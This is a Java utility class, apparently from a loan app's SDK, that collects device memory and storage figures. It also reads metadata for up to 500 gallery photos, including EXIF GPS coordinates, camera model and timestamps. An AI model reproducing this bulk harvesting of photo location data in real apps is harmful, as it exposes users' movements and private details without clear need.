package com.homecredit.loan.hcjson;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.ActivityManager.MemoryInfo;
import android.content.Context;
import android.database.Cursor;
import android.graphics.BitmapFactory;
import android.media.ExifInterface;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.os.storage.StorageManager;
import android.provider.MediaStore;
import android.text.TextUtils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.lang.ref.WeakReference;
import java.lang.reflect.Array;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.Locale;

public class FileSizeUtil {
    private static final int ERROR = -1;
    private static WeakReference<JSONObject> sPhotosMsgCache = null;

    FileSizeUtil() {
    }

    private static boolean externalMemoryAvailable() {
        return Environment.getExternalStorageState().equals("mounted");
    }

    public static JSONObject getStorageInfo() {
        JSONObject storageInfo = new JSONObject();
        try {
            storageInfo.put("ram_total_size", CommonUtil.getNonNullText(getRamTotalSize(HcContext.getApplication())));
            storageInfo.put("ram_usable_size", CommonUtil.getNonNullText(getRamAvailSize(HcContext.getApplication())));
            storageInfo.put("internal_storage_usable", getAvailableInternalMemorySize());
            storageInfo.put("internal_storage_total", getTotalInternalMemorySize());
            storageInfo.put("memory_card_size", getTotalExternalMemorySize());
            storageInfo.put("memory_card_usable_size", getAvailableExternalMemorySize());
            storageInfo.put("memory_card_size_use", getTotalExternalMemorySize() - getAvailableExternalMemorySize());
            storageInfo.put("contain_sd", hasSDCard(HcContext.getApplication(), false) ? "1" : "0");
            storageInfo.put("extra_sd", hasSDCard(HcContext.getApplication(), true) ? "1" : "0");

            ActivityManager activityManager = (ActivityManager) HcContext.getApplication().getSystemService(Context.ACTIVITY_SERVICE);
            //
            int memory = activityManager.getMemoryClass();
            //2
            long maxMemory = Runtime.getRuntime().maxMemory();
            //
            long totalMemory = Runtime.getRuntime().totalMemory();
            //
            long freeMemory = Runtime.getRuntime().freeMemory();
            storageInfo.put("app_max_memory", maxMemory + "");
            storageInfo.put("app_available_memory", totalMemory + "");
            storageInfo.put("app_free_memory", freeMemory + "");
        }catch (Exception e){
            e.printStackTrace();
        }

        return storageInfo;
    }

    private static String getRamTotalSize(Context paramContext) {
        ActivityManager activityManager = (ActivityManager) paramContext.getSystemService(Context.ACTIVITY_SERVICE);
        MemoryInfo memoryInfo = new MemoryInfo();
        activityManager.getMemoryInfo(memoryInfo);
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(memoryInfo.totalMem);
        stringBuilder.append("");
        return stringBuilder.toString();
    }

    private static String getRamAvailSize(Context paramContext) {
        ActivityManager activityManager = (ActivityManager) paramContext.getSystemService(Context.ACTIVITY_SERVICE);
        MemoryInfo memoryInfo = new MemoryInfo();
        activityManager.getMemoryInfo(memoryInfo);
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(memoryInfo.availMem);
        stringBuilder.append("");
        return stringBuilder.toString();
    }

    private static long getAvailableInternalMemorySize() {
        File path = Environment.getDataDirectory();
        StatFs stat = new StatFs(path.getPath());
        long blockSize = (long) stat.getBlockSize();
        long availableBlocks = (long) stat.getAvailableBlocks();
        return availableBlocks * blockSize;
    }

    private static long getTotalInternalMemorySize() {
        File path = Environment.getDataDirectory();
        StatFs stat = new StatFs(path.getPath());
        long blockSize = (long) stat.getBlockSize();
        long totalBlocks = (long) stat.getBlockCount();
        return totalBlocks * blockSize;
    }

    private static long getAvailableExternalMemorySize() {
        if (externalMemoryAvailable()) {
            File path = Environment.getExternalStorageDirectory();
            StatFs stat = new StatFs(path.getPath());
            long blockSize = (long) stat.getBlockSize();
            long availableBlocks = (long) stat.getAvailableBlocks();
            return availableBlocks * blockSize;
        } else {
            return -1L;
        }
    }

    private static long getTotalExternalMemorySize() {
        if (externalMemoryAvailable()) {
            File path = Environment.getExternalStorageDirectory();
            StatFs stat = new StatFs(path.getPath());
            long blockSize = (long) stat.getBlockSize();
            long totalBlocks = (long) stat.getBlockCount();
            return totalBlocks * blockSize;
        } else {
            return -1L;
        }
    }

    private static boolean hasSDCard(Context mContext, boolean canRemovable) {
        StorageManager mStorageManager = (StorageManager) mContext.getSystemService(Context.STORAGE_SERVICE);
        Class storageVolumeClazz = null;

        try {
            storageVolumeClazz = Class.forName("android.os.storage.StorageVolume");
            Method getVolumeList = mStorageManager.getClass().getMethod("getVolumeList");
            Method isRemovable = storageVolumeClazz.getMethod("isRemovable");
            Object result = getVolumeList.invoke(mStorageManager);
            int length = Array.getLength(result);

            for (int i = 0; i < length; ++i) {
                Object storageVolumeElement = Array.get(result, i);
                boolean removable = (Boolean) isRemovable.invoke(storageVolumeElement);
                if (removable == canRemovable) {
                    return true;
                }
            }
        } catch (ClassNotFoundException var11) {
            var11.printStackTrace();
        } catch (InvocationTargetException var12) {
            var12.printStackTrace();
        } catch (NoSuchMethodException var13) {
            var13.printStackTrace();
        } catch (IllegalAccessException var14) {
            var14.printStackTrace();
        }

        return false;
    }


    public static JSONObject getImagesMsg() {
        if (sPhotosMsgCache != null && sPhotosMsgCache.get() != null && !TextUtils.isEmpty((sPhotosMsgCache.get()).toString())) {
            return sPhotosMsgCache.get();
        } else if (!CommonUtil.haveSelfPermission(HcContext.getApplication(), "android.permission.READ_EXTERNAL_STORAGE")) {
            return getDefaultPhotosMsg();
        } else {
            Cursor photoCursor = HcContext.getApplication().getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, (String[]) null, (String) null, (String[]) null, (String) null);
            boolean isInternalUrl = false;
            if (photoCursor == null) {
                isInternalUrl = true;
                photoCursor = HcContext.getApplication().getContentResolver().query(MediaStore.Images.Media.INTERNAL_CONTENT_URI, (String[]) null, (String) null, (String[]) null, (String) null);
            }

            if (photoCursor == null) {
                return getDefaultPhotosMsg();
            } else {
                JSONObject albsRoot = new JSONObject();
                JSONObject albsData = new JSONObject();
                JSONArray imgDataList = new JSONArray();
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss", Locale.getDefault());

                for (int i = 0; i < 500 && photoCursor.moveToNext(); ++i) {
                    imgDataList = queryImagesMsg(photoCursor, imgDataList, sdf);
                }

                if (!isInternalUrl && imgDataList.length() < 500) {
                    releaseCursor(photoCursor);
                    return appendImagesMsg(albsRoot, albsData, imgDataList);
                } else {
                    putImagesMsg(albsRoot, albsData, imgDataList);
                    releaseCursor(photoCursor);
                    return sPhotosMsgCache.get();
                }
            }
        }
    }

    private static void releaseCursor(Cursor photoCursor) {
        if (photoCursor != null && !photoCursor.isClosed()) {
            photoCursor.close();
        }
    }

    public static JSONObject appendImagesMsg(JSONObject albs, JSONObject jsonObject, JSONArray dataList) {
        Cursor internalCursor = HcContext.getApplication().getContentResolver().query(MediaStore.Images.Media.INTERNAL_CONTENT_URI, (String[]) null, (String) null, (String[]) null, (String) null);
        if (internalCursor == null) {
            putImagesMsg(albs, jsonObject, dataList);
            return sPhotosMsgCache.get();
        } else {
            int num = 500 - dataList.length();
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss", Locale.getDefault());

            for (int i = 0; i < num && internalCursor.moveToNext(); ++i) {
                dataList = queryImagesMsg(internalCursor, dataList, sdf);
            }

            putImagesMsg(albs, jsonObject, dataList);
            releaseCursor(internalCursor);
            return sPhotosMsgCache.get();
        }
    }

    private static void putImagesMsg(JSONObject albs, JSONObject jsonObject, JSONArray dataList) {
        try {
            jsonObject.put("dataList", dataList);
            albs.put("albs", jsonObject);
            sPhotosMsgCache = new WeakReference(albs);
        } catch (JSONException var4) {
            var4.printStackTrace();
            sPhotosMsgCache = new WeakReference(getDefaultPhotosMsg());
        }

    }

    private static JSONArray queryImagesMsg(Cursor internalCursor, JSONArray dataList, SimpleDateFormat sdf) {
        long photoDate = internalCursor.getLong(internalCursor.getColumnIndexOrThrow("datetaken"));
        @SuppressLint("Range") String photoName = internalCursor.getString(internalCursor.getColumnIndex("_display_name"));
        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inJustDecodeBounds = true;
        @SuppressLint("Range") String photoPath = internalCursor.getString(internalCursor.getColumnIndex("_data"));
        @SuppressLint("Range") String saveTime = internalCursor.getString(internalCursor.getColumnIndex("date_modified"));
        BitmapFactory.decodeFile(photoPath, options);
        String photoH = String.valueOf(options.outHeight);
        String photoW = String.valueOf(options.outWidth);
        JSONObject data = new JSONObject();

        try {
            ExifInterface exifInterface = new ExifInterface(photoPath);
            String takeTime = "";

            try {
                takeTime = sdf.parse(exifInterface.getAttribute("DateTime")).toString();
            } catch (Exception var15) {
                takeTime = "";
            }

            float[] latLongResult = new float[2];
            exifInterface.getLatLong(latLongResult);
            data.put("name", photoName);
            data.put("author", TextUtils.isEmpty(exifInterface.getAttribute("Artist")) ? Build.MODEL : exifInterface.getAttribute("Artist"));
            data.put("height", photoH);
            data.put("width", photoW);
            data.put("latitude", ((double) latLongResult[0]) + "");
            data.put("longitude", ((double) latLongResult[1]) + "");
            data.put("date", sdf.format(photoDate));
            data.put("createTime", sdf.format(System.currentTimeMillis()));
            data.put("model", CommonUtil.getNonNullText(exifInterface.getAttribute("Model")));
            data.put("take_time", takeTime);
            data.put("save_time", saveTime);
            data.put("orientation", CommonUtil.getNonNullText(exifInterface.getAttribute("Orientation")));
            data.put("x_resolution", CommonUtil.getNonNullText(exifInterface.getAttribute("XResolution")));
            data.put("y_resolution", CommonUtil.getNonNullText(exifInterface.getAttribute("YResolution")));
            data.put("gps_altitude", CommonUtil.getNonNullText(exifInterface.getAttribute("GPSAltitude")));
            data.put("gps_processing_method", CommonUtil.getNonNullText(exifInterface.getAttribute("GPSProcessingMethod")));
            data.put("lens_make", CommonUtil.getNonNullText(exifInterface.getAttribute("Make")));
            data.put("lens_model", CommonUtil.getNonNullText(exifInterface.getAttribute("Model")));
            data.put("focal_length", CommonUtil.getNonNullText(exifInterface.getAttribute("FocalLength")));
            data.put("flash", CommonUtil.getNonNullText(exifInterface.getAttribute("Flash")));
            data.put("software", CommonUtil.getNonNullText(exifInterface.getAttribute("Software")));
            dataList.put(data);
        } catch (Exception var16) {
            var16.printStackTrace();
        }

        return dataList;
    }

    public static JSONObject getDefaultPhotosMsg() {
        return new JSONObject();
    }

}